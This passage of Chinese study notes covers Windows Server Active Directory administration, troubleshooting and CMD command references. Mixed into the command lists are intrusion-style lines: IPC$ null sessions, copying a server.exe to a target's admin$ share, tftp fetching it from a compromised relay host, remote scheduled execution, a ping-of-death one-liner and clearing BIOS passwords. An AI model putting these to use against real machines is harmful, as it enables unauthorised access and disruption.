（进入这个管理工具，专门管理AD活动目录的）b、Active instance ntds （将实例名设置为“NTDS”）c、Authoritative restore （进入授权还原命令模式）d、Restore object cn=aa （用户名），cn=users ，（代表还原账户所在的位置），dc=benet，（域名），dc=com （域后缀）如果还原OU 把cn改成OU （注意：如果该用户直接在域中不在users中，可省略cn=users）7、验证 ：只有做了授权的用户或OU会恢复 操作主机本章结构一、操作主机概念二、转移和占用三、操作主机应用 （2003的AD 升级到2008 AD） 具体知识点一、操作主机概念（一）、单主复制（出现Windows NT 4.0的域环境下；域控制器分为PDC （主域控）和BDC （备份域控）两种；PDC可以修改数据库内容；BDC只能读取AD数据库内容） （二）、多主复制（Windows 2000后；所有域控制器都可以修改AD数据库内容）缺点：所有域控制器的地位平等 （造成网络中某些功能不合适） （三）、操作主机（是域控制器的一种角色，担任不同的角色的域控制器有不同功能） （四）、五种操作主机角色范围 名称 作用 默认位置 管理工具林内唯一 架构主机 统一林中所有对象及其属性 林内的第一台DC上 AD架构regsvr32 schmmgmt.dll)注册 域命名主机 防止林中域名重复 AD域和信任关系域内唯一 PDC仿真主机 域内密码和时间同步；支持2000之前的系统 域内第一台DC AD用户和计算机 RID主机 域内分配RID号（SID=域ID + RID） 基础结构主机 所在域中对象到其他域的引用 二、转移和占用（一）、为什么要转移和占用？ （P130)（二）、转移 正常的角色转换 （担任角色的主机和目标主机需要联机）（三）、占用 强制手段转移操作主机角色操作步骤： 1、 Ntdsutil 进入管理工具 2、 roles 3、 connection 4、 connect to server 本机的全名 （目标DC 的FQDN） 5、 quit 后退一步 6、 Seize 五种操作主机角色 （逐一操作）注意：1、能转移绝不占用 2、被占用的操作角色不要再连接到网络上 三、将Windows Server 2003的AD升级到Windows Server 2008AD（一）、网络环境已知的2003的域控制器和一台2008工作组环境的服务器 （二）、目标将2008服务器变成该网络的域控制器 （三）、具体步骤1、扩展2003的功能 （因为2003不支持2008的功能）a、将2008的光盘插入2003系统中 运行命令 D: 进入光驱b、运行命令 cd source \adprepc、adprep.exe /forestprep 扩展林信息 输入 C 回车d、提升域功能级别为本机模式 （即域功能级别为2003）e、adprep.exe /domainprep （扩展域架构）f、adprep.exe /domainprep /gpprep （更新组策略对象权限）g、adprep.exe /rodcprep （更新对只读域控的支持） 2、将2008变成额外域控制器 （将首选DNS指向自己）3、转移操作主机角色到2008上4、卸载2003域控制器5、先提升林功能级别和域功能级别6、删除2003的残余信息 （在AD站点和服务） AD常见故障排查本章结构一、AD常见故障排查思路二、常见故障举例 具体知识点一、常见故障及排障思路（一）、常见故障1、加入域失败 2、域用户无法登录 3、域登录缓慢4、组策略部署不生效 5、数据同步失败 （二）、排障思路1、单一用户 用户是否禁用、密码是否过期、是否有权限2、单一客户端 时间是否同步、IP是否设置正确、DNS是否正确3、网络 交换路由设备4、服务器 AD是否正常运行，DNS服务器是否正常工作 二、常见故障举例（一）、客户机无法加入域1、分析：不是单一用户 单一计算机 （DNS设置是否正确）测试 ：ping ip 和 域名查看DNS缓存的命令： ipconfig /displaydns刷新DNS缓存 ipconfig /flushdns （清空）2、解决方法：设置正确的DNS指向，清空DNS缓存 （二）、用户无法登录1、分析：1）、换用户登录，依旧不能登录说明不是用户的问题2）、换客户端登录，依旧不能登录说明不是客户端问题3）、用ping命令验证 ： ping IP地址可通；但是ping 域名不同 得出是DNS有问题4）、首先检查DNS客户端；第二步检查DNS服务器问题2、解决方法：重启DNS服务 （三）、部分用户登录缓慢1、分析：1）、能登录，但是时间长说明不是客户端问题2）、ping 两台DC的IP都能通，但是Ping 域名不通说明网络没问题还是DNS问题3）、用nslookup 解析域名失败，换首选DNS能成功，说明其中一个DNS服务器有问题2、解决方法：换DNS首选指向，解决故障的DNS服务器 （四）、组策略不生效的问题1、分析：1）、是否对所有用户都不生效2）、在服务器上运行 “gpupdate /force”刷新组策略 （重启服务器和客户端）3）、检查是计算机配置还是用户配置4）、检查组策略是否有冲突 （LSDOU顺序及组策略应用规则） （五）、DC间复制数据失败1、分析：现象两台DC，在其中一台新建账户，发现账户不能同步2、解决方法：DC间影响数据同步的因素1）、网络问题 2）、时间是否同步如果手动复制失败，时间问题同步时间： net time \对方的主机名（或IP地址） /set /y 多域间访问本章结构一、林内信任关系二、林间信任关系 具体知识点一、林内信任关系（一）、林根域、子域、树根域的概念Enterprise Admins （企业管理组）：可以对活动目录 1、林根域：林中创建的第一个域 的整个林做修改Schema Admins （架构管理组）：扩展林架构 2、子域：向域树中添加的任何新域都叫子域，子域的域名= 自己的名字 + 父域的域名 3、树根域：在林环境中建立的具有独立的域名的一个域树 （二）、林内的信任关系1、搭建环境：必须是林根域Enterprise Admins 成员2、信任关系特点a、自动建立 （环境搭建完成后自动建立 树根信任和父子信任）b、双向 c、可传递的信任 A和B相互信任 B和C相互信任 A和C相互信任3、验证方法 ： AGDLP规则1、A 用户；G代表全局组、DL代表本地域组、P权限将本域中的账户加入全局组（范围信任整个林及信任域）；将全局组加入信任域的本地域组；给本地域组赋予权限；本域中的账户可以访问信任域中的资源2、林中所有域账户都能在同一台客户机去登录自己的域 二、林间信任（一）、外部信任特点：1、手动建立 2、不可传递性 3、分双向和单向 外传：本地域信任指定域 单向内传： 指定域信任本域作用：实现特定域之间的信任，从而实现相互访问 （二）、林信任特点： 1、手动建立 2、可传递性 3、只能在林根域上建立 4、分双向和单向作用：实现林间任意域之间的信任及相互访问 升级域和林功能级别考试 写出打开本地安全策略 本地组策略的命令 答：打开本地安全策略命令：Secpol.msc ​ 打开本地组策略命令：gpedit.msc 写出所有用户和组相关的所有windows命令 答： 查看当前存在用户： net user 查看当前用户组： net localgroup 添加用户（以添加用户Waldo，密码为cuit为例）： net user Waldo cuit /add 添加用户到组（以添加用户Waldo到Administrators组为例）： net localgroup Administrators Waldo /add skyfall007 windows下CMD命令大全 CMD命令：开始－&gt;运行－&gt;键入cmd或command（在命令行里可以看到系统版本、文件系统版本） chcp 修改默认字符集 chcp 936默认中文 chcp 65001 \1. appwiz.cpl：程序和功能 \2. calc：启动计算器 \5. chkdsk.exe：Chkdsk磁盘检查（管理员身份运行命令提示符） \6. cleanmgr: 打开磁盘清理工具 \9. cmd.exe：CMD命令提示符 \10. 自动关机命令 Shutdown -s -t 600：表示600秒后自动关机 shutdown -a ：可取消定时关机 Shutdown -r -t 600：表示600秒后自动重启 \12. CompMgmtLauncher：计算机管理 \13. compmgmt.msc：计算机管理 \14. credwiz：备份或还原储存的用户名和密码 \16. control：控制面版 \17. dcomcnfg：打开系统组件服务 \19. devmgmt.msc：设备管理器 \20. desk.cpl：屏幕分辨率 \21. dfrgui：优化驱动器 Windows 7→dfrg.msc：磁盘碎片整理程序 \22. dialer：电话拨号程序 \23. diskmgmt.msc：磁盘管理 \24. dvdplay：DVD播放器 \25. dxdiag：检查DirectX信息 \26. eudcedit：造字程序 \27. eventvwr：事件查看器 \28. explorer：打开资源管理器 \29. Firewall.cpl：Windows防火墙 \31. fsmgmt.msc：共享文件夹管理器 \32. gpedit.msc：组策略 \33. hdwwiz.cpl：设备管理器 \34. inetcpl.cpl：Internet属性 \35. intl.cpl：区域 \36. iexpress：木马捆绑工具，系统自带 \37. joy.cpl：游戏控制器 \38. logoff：注销命令 \39. lusrmgr.msc：本地用户和组 \40. lpksetup：语言包安装/删除向导，安装向导会提示下载语言包 \41. lusrmgr.msc：本机用户和组 \42. main.cpl：鼠标属性 \43. mmsys.cpl：声音 \45. mem.exe：显示内存使用情况（如果直接运行无效，可以先管理员身份运行命令提示符，在命令提示符里输入mem.exe&gt;d:a.txt 即可打开d盘查看a.txt，里面的就是内存使用情况了。当然什么盘什么文件名可自己决定。） \47. mmc：打开控制台 \48. mobsync：同步命令 \50. Msconfig.exe：系统配置实用程序 \51. msdt：微软支持诊断工具 \52. msinfo32：系统信息 \53. mspaint：画图 \54. Msra：Windows远程协助 \55. mstsc：远程桌面连接 \56. NAPCLCFG.MSC：客户端配置 \57. ncpa.cpl：网络连接 \58. narrator：屏幕“讲述人” \59. Netplwiz：高级用户帐户控制面板，设置登陆安全相关的选项 \60. netstat : an(TC)命令检查接口 \61. notepad：打开记事本 \62. Nslookup：IP地址侦测器 \63. odbcad32：ODBC数据源管理器 \64. OptionalFeatures：打开“打开或关闭Windows功能”对话框 \65. osk：打开屏幕键盘 \66. perfmon.msc：计算机性能监测器 \67. perfmon：计算机性能监测器 \68. PowerShell：提供强大远程处理能力 \69. printmanagement.msc：打印管理 \70. powercfg.cpl：电源选项 \71. psr：问题步骤记录器 \72. Rasphone：网络连接 \73. Recdisc：创建系统修复光盘 \74. Resmon：资源监视器 \75. Rstrui：系统还原 \76. regedit.exe：注册表 \77. regedt32：注册表编辑器 \78. rsop.msc：组策略结果集 \79. sdclt：备份状态与配置，就是查看系统是否已备份 \80. secpol.msc：本地安全策略 \81. services.msc：本地服务设置 \82. sfc /scannow：扫描错误并复原/windows文件保护 \83. sfc.exe：系统文件检查器 \84. shrpubw：创建共享文件夹 \85. sigverif：文件签名验证程序 \86. slui：Windows激活，查看系统激活信息 \87. slmgr.vbs -dlv ：显示详细的许可证信息 slmgr.vbs -dli ：显示许可证信息 slmgr.vbs -xpr ：当前许可证截止日期 slmgr.vbs -dti ：显示安装ID 以进行脱机激 slmgr.vbs -ipk ：(Product Key)安装产品密钥 slmgr.vbs -ato ：激活Windows slmgr.vbs -cpky ：从注册表中清除产品密钥（防止泄露引起的攻击） slmgr.vbs -ilc ：(License file)安装许可证 slmgr.vbs -upk ：卸载产品密钥 slmgr.vbs -skms ：(name[ort] )批量授权 \88. snippingtool：截图工具，支持无规则截图 \89. soundrecorder：录音机，没有录音时间的限制 \90. StikyNot：便笺 \91. sysdm.cpl：系统属性 \92. sysedit：系统配置编辑器 \93. syskey：系统加密，一旦加密就不能解开，保护系统的双重密码 \94. taskmgr：任务管理器（旧版） \95. TM任务管理器（新版） \96. taskschd.msc：任务计划程序 \97. timedate.cpl：日期和时间 \98. UserAccountControlSettings用户账户控制设置 \99. utilman：辅助工具管理器 \100. wf.msc：高级安全Windows防火墙 \101. WFS：Windows传真和扫描 \102. wiaacmgr：扫描仪和照相机向导 \103. winver：关于Windows \104. wmimgmt.msc：打开windows管理体系结构(WMI) \105. write：写字板 \106. wscui.cpl：操作中心 \107. wscript：windows脚本宿主设置 \108. wuapp：Windows更新 1. gpedit.msc—–组策略 2. sndrec32——-录音机 3. Nslookup——-IP地址侦测器 ，是一个 监测网络中 DNS 服务器是否能正确实现域名解析的命令行工具。 它在 Windows NT/2000/XP 中均可使用 , 但在 Windows 98 中却没有集成这一个工具。 4. explorer——-打开资源管理器 5. logoff———注销命令 6. shutdown——-60秒倒计时关机命令 7. lusrmgr.msc—-本机用户和组 8. services.msc—本地服务设置 9. oobe/msoobe /a—-检查XP是否激活 10. notepad——–打开记事本 11. cleanmgr——-垃圾整理 12. net start messenger—-开始信使服务 13. compmgmt.msc—计算机管理 14. net stop messenger—–停止信使服务 15. conf———–启动netmeeting 16. dvdplay——–DVD播放器 17. charmap——–启动字符映射表 18. diskmgmt.msc—磁盘管理实用程序 19. calc———–启动计算器 20. dfrg.msc——-磁盘碎片整理程序 21. chkdsk.exe—–Chkdsk磁盘检查 22. devmgmt.msc— 设备管理器 23. regsvr32 /u *.dll—-停止dll文件运行 24. drwtsn32—— 系统医生 25. rononce -p—-15秒关机 26. dxdiag———检查DirectX信息 27. regedt32——-注册表编辑器 28. Msconfig.exe—系统配置实用程序 29. rsop.msc——-组策略结果集 30. mem.exe——–显示内存使用情况 31. regedit.exe—-注册表 32. winchat——–XP自带局域网聊天 33. progman——–程序管理器 34. winmsd———系统信息 35. perfmon.msc—-计算机性能监测程序 36. winver———检查Windows版本 37. sfc /scannow—–扫描错误并复原 38. taskmgr—–任务管理器（2000/xp/2003 39. winver———检查Windows版本 40. wmimgmt.msc—-打开windows管理体系结构(WMI) 41. wupdmgr——–windows更新程序 42. wscript——–windows脚本宿主设置 43. write———-写字板 44. winmsd———系统信息 45. wiaacmgr——-扫描仪和照相机向导 46. winchat——–XP自带局域网聊天 47. mem.exe——–显示内存使用情况 48. Msconfig.exe—系统配置实用程序 49. mplayer2——-简易widnows media player 50. mspaint——–画图板 51. mstsc———-远程桌面连接 52. mplayer2——-媒体播放机 53. magnify——–放大镜实用程序 54. mmc————打开控制台 55. mobsync——–同步命令 56. dxdiag———检查DirectX信息 57. iexpress——-木马捆绑工具，系统自带 58. fsmgmt.msc—–共享文件夹管理器 59. utilman——–辅助工具管理器 60. diskmgmt.msc—磁盘管理实用程序 61. dcomcnfg——-打开系统组件服务 62. ddeshare——-打开DDE共享设置 110. osk————打开屏幕键盘 111. odbcad32——-ODBC数据源管理器 112. oobe/msoobe /a—-检查XP是否激活 114. logoff———注销命令 66. notepad——–打开记事本 67. nslookup——-网络管理的工具向导 68. ntbackup——-系统备份和还原 69. narrator——-屏幕“讲述人” 70. ntmsmgr.msc—-移动存储管理器 71. ntmsoprq.msc—移动存储管理员操作请求 72. netstat -an—-(TC)命令检查接口 73. syncapp——–创建一个公文包 74. sysedit——–系统配置编辑器 75. sigverif——-文件签名验证程序 76. ciadv.msc——索引服务程序 77. shrpubw——–创建共享文件夹 78. secpol.msc—–本地安全策略 79. syskey———系统加密，一旦加密就不能解开，保护windows xp系统的双重密码 80. services.msc—本地服务设置 81. Sndvol32——-音量控制程序 82. sfc.exe——–系统文件检查器 83. sfc /scannow—windows文件保护 84. ciadv.msc——索引服务程序 85. tourstart——xp简介（安装完成后出现的漫游xp程序） 86. taskmgr——–任务管理器 87. eventvwr——-事件查看器 88. eudcedit——-造字程序 89. compmgmt.msc—计算机管理 90. packager——-对象包装程序 91. perfmon.msc—-计算机性能监测程序 92. charmap——–启动字符映射表 93. cliconfg——-SQL SERVER 客户端网络实用程序 94. Clipbrd——–剪贴板查看器 95. conf———–启动netmeeting 96. certmgr.msc—-证书管理实用程序 97. regsvr32 /u *.dll—-停止dll文件运行 98. regsvr32 /u zipfldr.dll——取消ZIP支持 99. cmd.exe——–CMD命令提示符 100. chkdsk.exe—–Chkdsk磁盘检查 1.磁盘操作， fdisk 隐含 参数 /mbr 重建主引导记录fdisk /mbr 重建主引导记录 fdisk 在DOS7.0以后增加了/cmbr参数，可在挂接多个物理硬盘时，重建排序在后面的硬盘的主引导记录，例如：fdisk /cmbr 2，可重写第二个硬盘的主引导记录。（在使用时要十分小心，避免把好的硬盘引导记录损坏） format 参数： /q 快速格式化 /u 不可恢复 /autotest 不提示 /s 创建 MS-DOS 引导盘 format c: /q /u /autotest 2.目录操作 DIR [目录名或文件名] [/S][/W][/P][/A] 列出目录 参数: /s 查找子目录/w 只显示文件名 /p 分页/a 显示隐藏文件 DIR format.exe /s查找该盘的format.exe文件并报告位置 MD (MKDIR) [目录名] 创建目录 MKDIR HELLOWORLD 创建HELLOWORLD目录 CD (CHDIR) [目录名] PS:可以使用相对目录或绝对目录 进入目录 CD AA 进入当前文件夹下的AA目录,cd .. 进入上一个文件夹cd \返回根目录;cd c:\windows 进入c:\windows文件夹 RD ( RMDIR) [目录名] 删除目录 RD HELLOWORLD 删除HELLOWORLD目录 3.文件操作 删除目录及其文件： rmdir [目录名或文件名] [/S][/W][/P][/A] 。例 rmdir c:\qqdownload/s 删除C盘的qqdownload目录。 del [目录名或文件名] [/f][/s][/q] 删除 参数:/f 删除只读文件/s 删除该目录及其下的所有内容 /q 删除前不确认 del c:\del /s /q 自动删除c盘的del目录。 copy [源文件或目录] [目标目录] 复制文件 copy d:\pwin98*.* c:\presetup 将d盘的pwin98的所有文件复制到c盘的presetup下。 attrib [参数][源文件或目录] 文件属性操作命令，attrib命令可以列出或修改磁盘上文件的属性，文件属性包括文档（A）、只读(R)、隐藏(H)、系统(S)，例如：attrib -h -r -s io.sys 执行这一命令后，将把DOS系统文件io.sys文件的只读、隐藏、系统属性去掉，这时将可以直接通过dir命令看到io.sys文件。attrib +h +r +s autoexec.bat将为自动批处理文件增加以上属性。 4.内存操作 debug 调试内存 参数 -w [文件名] 写入二进制文件 -o [地址1] [地址2] 输出内存 -q 退出 exp:o 70 10[return] o 71 01 [return] 01[return] q[return] DOS下通过写70h/71h PORT改变BIOS密码在CMOS中存放的对应位置的值,用以清除AWARD BIOS密码.debug 还可以破解硬盘保护卡等,但只可以在纯DOS下用。 5.分区操作 给磁盘分区，一般都会分成四个区，磁盘分区由主分区、扩展分区、逻辑分区组成。 PQ和Acronis Disk Director这两个工具都可以在不丢失数据的情况下对分区进行调整大小，以及合并等操作，XP系统的话你用PQ，WIN7系统的话用Acronis Disk Director 操作基本一样，可以去网上找教程来看看，再不重装系统的情况下都能调整分区大小，但是建议你还是先备份下数据再调整，毕竟对硬盘直接进行的操作有一定的危险性。 net use ipipc$ “ “ /user:” “ 建立IPC空链接 net use ipipc$ “密码” /user:”用户名” 建立IPC非空链接 net use h: ipc$ “密码” /user:”用户名” 直接登陆后映射对方C：到本地为H: net use h: ipc$ 登陆后映射对方C：到本地为H: net use ipipc$ /del 删除IPC链接 net use h: /del 删除映射对方到本地的为H:的映射 net user 用户名 密码 /add 建立用户 net user guest /active:yes 激活guest用户 net user 查看有哪些用户 net user 帐户名 查看帐户的属性 net localgroup administrators 用户名 /add 把“用户”添加到管理员中使其具有管理员权限 net start 查看开启了哪些服务 net start 服务名 开启服务；(如:net start telnet， net start schedule) net stop 服务名 停止某服务 net time 目标ip 查看对方时间 net time 目标ip /set 设置本地计算机时间与“目标IP”主机的时间同步,加上参数/yes可取消确认信息 net view 查看本地局域网内开启了哪些共享 net view ip 查看对方局域网内开启了哪些共享 net config 显示系统网络设置 net logoff 断开连接的共享 net pause 服务名 暂停某服务 net send ip “文本信息” 向对方发信息 net ver 局域网内正在使用的网络连接类型和信息 net share 查看本地开启的共享 net share ipc$ 开启ipc$共享 net share ipc$ /del 删除ipc$共享 net share c$ /del 删除C：共享 net user guest 12345 用guest用户登陆后用将密码改为12345 net password 密码 更改系统登陆密码 netstat -a 查看开启了哪些端口,常用netstat -an netstat -n 查看端口的网络连接情况，常用netstat -an netstat -v 查看正在进行的工作 netstat -p 协议名 例：netstat -p tcq/ip 查看某协议使用情况 netstat -s 查看正在使用的所有协议使用情况 nbtstat -A ip 对方136到139其中一个端口开了的话，就可查看对方最近登陆的用户名 tracert -参数 ip(或计算机名) 跟踪路由（数据包），参数：“-w数字”用于设置超时间隔。 ping ip(或域名) 向对方主机发送默认大小为32字节的数据，参数：“-l[空格]数据包大小”；“-n发送数据次数”；“-t”指一直ping。 ping -t -l 65550 ip 死亡之ping(发送大于64K的文件并一直ping就成了死亡之ping) ipconfig (winipcfg) 用于windows NT及XP(windows 95 98)查看本地ip地址，ipconfig可用参数“/all”显示全部配置信息 tlist -t 以树行列表显示进程(为系统的附加工具，默认是没有安装的，在安装目录的Support/tools文件夹内) kill -F 进程名 加-F参数后强制结束某进程(为系统的附加工具，默认是没有安装的，在安装目录的Support/tools文件夹内) del -F 文件名 加-F参数后就可删除只读文件,/AR、/AH、/AS、/AA分别表示删除只读、隐藏、系统、存档文件，/A-R、/A-H、/A-S、/A-A表示删除除只读、隐藏、系统、存档以外的文件。例如“DEL/AR .”表示删除当前目录下所有只读文件，“DEL/A-S .”表示删除当前目录下除系统文件以外的所有文件 del /S /Q 目录 或用：rmdir /s /Q 目录 /S删除目录及目录下的所有子目录和文件。同时使用参数/Q 可取消删除操作时的系统确认就直接删除。（二个命令作用相同） move 盘符路径要移动的文件名 存放移动文件的路径移动后文件名 移动文件,用参数/y将取消确认移动目录存在相同文件的提示就直接覆盖 fc one.txt two.txt &gt; 3st.txt 对比二个文件并把不同之处输出到3st.txt文件中，”&gt; “和”&gt; &gt;” 是重定向命令 at id号 开启已注册的某个计划任务 at /delete 停止所有计划任务，用参数/yes则不需要确认就直接停止 at id号 /delete 停止某个已注册的计划任务 at 查看所有的计划任务 at ip time 程序名(或一个命令) /r 在某时间运行对方某程序并重新启动计算机 finger username @host 查看最近有哪些用户登陆 telnet ip 端口 远和登陆服务器,默认端口为23 open ip 连接到IP（属telnet登陆后的命令） telnet 在本机上直接键入telnet 将进入本机的telnet copy 路径文件名1 路径文件名2 /y 复制文件1到指定的目录为文件2，用参数/y就同时取消确认你要改写一份现存目录文件 copy c:srv.exe ipadmin$ 复制本地c:srv.exe到对方的admin下 copy 1st.jpg/b+2st.txt/a 3st.jpg 将2st.txt的内容藏身到1st.jpg中生成3st.jpg新的文件，注：2st.txt文件头要空三排，参数：/b指二进制文件，/a指ASCLL格式文件 copy ipadmin$svv.exe c: 或:copyipadmin$. 复制对方admini$共享下的srv.exe文件（所有文件）至本地C： xcopy 要复制的文件或目录树 目标地址目录名 复制文件和目录树，用参数/Y将不提示覆盖相同文件 用参数/e才可连目录下的子目录一起复制到目标地址下。 tftp -i 自己IP(用肉机作跳板时这用肉机IP) get server.exec:server.exe 登陆后，将“IP”的server.exe下载到目标主机c:server.exe 参数：-i指以二进制模式传送，如传送exe文件时用，如不加-i 则以ASCII模式（传送文本文件模式）进行传送 tftp -i 对方IP put c:server.exe 登陆后，上传本地c:server.exe至主机 ftp ip 端口 用于上传文件至服务器或进行文件操作，默认端口为21。bin指用二进制方式传送（可执行文件进）；默认为ASCII格式传送(文本文件时) route print 显示出IP路由，将主要显示网络地址Network addres，子网掩码Netmask，网关地址Gateway addres，接口地址Interface arp 查看和处理ARP缓存，ARP是名字解析的意思，负责把一个IP解析成一个物理性的MAC地址。arp -a将显示出全部信息 start 程序名或命令 /max 或/min 新开一个新窗口并最大化（最小化）运行某程序或命令 mem 查看cpu使用情况 attrib 文件名(目录名) 查看某文件（目录）的属性 attrib 文件名 -A -R -S -H 或 +A +R +S +H 去掉(添加)某文件的 存档，只读，系统，隐藏 属性；用+则是添加为某属性 dir 查看文件，参数：/Q显示文件及目录属系统哪个用户，/T:C显示文件创建时间，/T:A显示文件上次被访问时间，/T:W上次被修改时间 date /t 、 time /t 使用此参数即“DATE/T”、“TIME/T”将只显示当前日期和时间，而不必输入新日期和时间 set 指定环境变量名称=要指派给变量的字符 设置环境变量 set 显示当前所有的环境变量 set p(或其它字符) 显示出当前以字符p(或其它字符)开头的所有环境变量 pause 暂停批处理程序，并显示出：请按任意键继续…. if 在批处理程序中执行条件处理（更多说明见if命令及变量） goto 标签 将cmd.exe导向到批处理程序中带标签的行（标签必须单独一行，且以冒号打头，例如：“：start”标签） call 路径批处理文件名 从批处理程序中调用另一个批处理程序 （更多说明见call /?） for 对一组文件中的每一个文件执行某个特定命令（更多说明见for命令及变量） echo on或off 打开或关闭echo，仅用echo不加参数则显示当前echo设置 echo 信息 在屏幕上显示出信息 echo 信息 &gt;&gt; pass.txt 将”信息”保存到pass.txt文件中 findstr “Hello” aa.txt 在aa.txt文件中寻找字符串hello find 文件名 查找某文件 title 标题名字 更改CMD窗口标题名字 color 颜色值 设置cmd控制台前景和背景颜色；0=黑、1=蓝、2=绿、3=浅绿、4=红、5=紫、6=黄、7=白、8=灰、9=淡蓝、A=淡绿、B=淡浅绿、C=淡红、D=淡紫、E=淡黄、F=亮白 prompt 名称 更改cmd.exe的显示的命令提示符(把C:、D:统一改为：EntSky ) ver 在DOS窗口下显示版本信息 winver 弹出一个窗口显示版本信息（内存大小、系统版本、补丁版本、计算机名） format 盘符 /FS:类型 格式化磁盘,类型:FAT、FAT32、NTFS ,例：Format D: /FS:NTFS md 目录名 创建目录 replace 源文件 要替换文件的目录 替换文件 ren 原文件名 新文件名 重命名文件名 tree 以树形结构显示出目录，用参数-f 将列出第个文件夹中文件名称 type 文件名 显示文本文件的内容 more 文件名 逐屏显示输出文件 doskey 要锁定的命令=字符 doskey 要解锁命令= 为DOS提供的锁定命令(编辑命令行，重新调用win2k命令，并创建宏)。如：锁定dir命令：doskey dir=entsky (不能用doskey dir=dir)；解锁：doskey dir= taskmgr 调出任务管理器 chkdsk /F D: 检查磁盘D并显示状态报告；加参数/f并修复磁盘上的错误 tlntadmn telnt服务admn,键入tlntadmn选择3，再选择8,就可以更改telnet服务默认端口23为其它任何端口 exit 退出cmd.exe程序或目前，用参数/B则是退出当前批处理脚本而不是cmd.exe path 路径可执行文件的文件名 为可执行文件设置一个路径。 cmd 启动一个win2K命令解释窗口。参数：/eff、/en 关闭、开启命令扩展；更我详细说明见cmd /? regedit /s 注册表文件名 导入注册表；参数/S指安静模式导入，无任何提示； regedit /e 注册表文件名 导出注册表 cacls 文件名 参数 显示或修改文件访问控制列表（ACL）——针对NTFS格式时。参数：/D 用户名:设定拒绝某用户访问；/P 用户名:perm 替换指定用户的访问权限；/G 用户名:perm 赋予指定用户访问权限；Perm 可以是: N 无，R 读取， W 写入， C 更改(写入)，F 完全控制；例：cacls D: est.txt /D pub 设定d: est.txt拒绝pub用户访问。 cacls 文件名 查看文件的访问用户权限列表 REM 文本内容 在批处理文件中添加注解 netsh 查看或更改本地网络配置情况 什么是SID?如何查看用户的SID 答：什么是**SID** Windows NT系统使用 SID 来跟踪每个帐户： 如果重命名管理员帐户，计算机仍然知道哪个帐户是管理员帐户。 这是因为 SID 不同于名称，它永远不会更改。例如，您可以重命名计算机上的 Administrator帐户，并且仍将该帐户用作管理员，这是因为 Windows 真正关心的并不是名称是什么；Windows 仍然知道该帐户是 Administrator 帐户，因为无论帐户名称如何变化，SID 保持不变。 如何查看用户的SID 按⊞ Win+X。随后会在屏幕的左下角打开Windows“超级用户”菜单。 单击命令提示符Command Prompt(admin)。随后会显示确认消息 单击是。随后会显示带有命令提示符的终端窗口。 \4. 输入WMIC useraccount get name,sid。此命令用于显示系统上所有用户帐户的SID。如果你知道用户名，将命令改为：wmic useraccount where name=”USER” get sid，其中“USER”是实际的用户名。 \5. 按↵ Enter。用户名右侧的一长串数字就是SID。 System用户和administrator用户的区别? 答：SYSTEM 用户和使用普通管理员用户对于文件有同样的特权。可是它们有不同的功能。系统帐户可以由 Windows 下执行的服务和操作系统使用。有很多服务和Windows 进程须要可以在内部登录 （比如在 Windows 安装过程中）而 系统帐户就是为该目的设计的；它是内部帐户，不显示在用户管理器，也无法加入到不论什么组，而且不能分配用户权限。默认情况下，系统帐户授予全然控制 NTFS 卷上的全部文件。在此系统帐户具有作为管理员帐户同样的功能权限。 而普通管理员账户是不可以在系统内部登录的。对于文件系统，管理员账户和SYSEM账户具有同样的权限。可是对于一些服务和进程，我们须要使用系统账户而非管理员账户，由于这些服务和进程要和系统交互，须要内部登录。 在运行计划任务的时候，假设我们使用NT AUTHORITY\SYSTEM账户，那么是不须要输入password的。可是使用管理员账户，我们必须输入password。一般我们使用系统账户，主要是为了防止管理员改变password后任务无法运行。对于一般的操作，能够使用不论什么一个账户可是我还是建议您使用管理员或者普通用户运行。假设和进程或者服务有关的话，您能够使用系统账户。 对于计划任务，假设须要该任务显示的话，必须以眼下登录的用户来运行，否则尽管该任务会运行，可是它仅仅是在后台运行，并不会在前台显示。 账户锁定时间为0是什么意思? 答：一直锁定，直到管理员改动设置 本地安全策略中经典模式的参考模型和仅来宾账户分别是什么意思 答：参考模型：登录需要用户名和密码 仅来宾账户：登陆不需要用户和密码，直接以来宾访问 密码保护的共享是什么意思 答：禁止密码为空的账户访问 ftp dhcp 远程桌面 DNS web文件共享等服务所使用的端口号分别是什么 答：FTB（20 21） DHCB（67 68） 远程桌面（3389） DNS（58） WEB（80） FTP实现的思路 答：1. 首先在开始–管理工具–服务器管理器中“添加角色” \2. 选择WEB服务器 找到FTB服务器安装 \3. 安装成功后，点击关闭。接着添加用户，用于ftp的指定用户 \4. 添加FTB站点 \5. 设置FTB名称，物理路径，IP地址，身份验证基本，允许访问指定用户，权限读取写入。 \6. 添加完站点之后，在服务器内部浏览器输入ftp://localhost后，可以成功弹出登录框，输入用户名密码完成后。 设置FTP服务器时,本地NTFS权限和FTP权限的应用规则 答：取严格的权限应用，一般将FTP权限设为everyone 完全控制。 写出命令行访问ftp服务器的所有相关命令 答：FTP的命令行格式为：ftp -v -d -i -n -g [主机名]，其中 -v显示远程服务器的所有响应信息； -n限制ftp的自动登录，即不使用； .n etrc文件； -d使用调试方式； -g取消全局文件名。 ftp使用的内部命令如下(中括号表示可选项): \1. append local-file[remote-file]：将本地文件追加到远程系统主机，若未指定远程系统文件名，则使用本地文件名。 \2. ascii：使用ascii类型传输方式。 \3. bell：每个命令执行完毕后计算机响铃一次。 \4. bin（全命令binary）：使用二进制文件传输方式 \5. bye：退出ftp会话过程 \6. cd remote-dir：进入远程主机目录。 \7. close：中断与远程服务器的ftp会话(与open对应) \8. delete remote-file：删除远程主机文件。 \9. debug[debug-value]：设置调试方式，显示发送至远程主机的每条命令，如：deb up 3，若设为0，表示取消debug。 \10. dir[remote-dir][local-file]：显示远程主机目录，并将结果存入本地文件local-file。 \11. disconnection：同close。 \12. get remote-file[local-file]：将远程主机的文件remote-file传至本地硬盘的local-file。 \13. glob：设置mdelete，mget，mput的文件名扩展，缺省时不扩展文件名，同命令行的-g参数。 \14. hash：每传输1024字节，显示一个hash符号(#) \15. help[cmd]：显示ftp内部命令cmd的帮助信息，如：help get。 \16. lcd[dir]：将本地工作目录切换至dir。 17.ls[remote-dir][local-file]：显示远程目录remote-dir，并存入本地文件local-file。 \18. mdelete[remote-file]：删除远程删除多个主机文件 \19. mdir remote-files local-file：与dir类似，但可指定多个远程文件，如：mdir .o..zipoutfile \20. mget remote-files：传输多个远程文件。 \21. mkdir dir-name：在远程主机中建一目录 \22. mls remote-file local-file：同nlist，但可指定多个文件名 \23. mput local-file：将多个文件传输至远程主机。 \24. open host[port]：建立指定ftp服务器连接，可指定连接端口 \25. prompt：设置多个文件传输时的交互提示 \26. put local-file[remote-file]：将本地文件local-file传送至远程主机。 \27. pwd：显示远程主机的当前工作目录。 \28. quit：同bye，退出ftp会话。 \29. quote 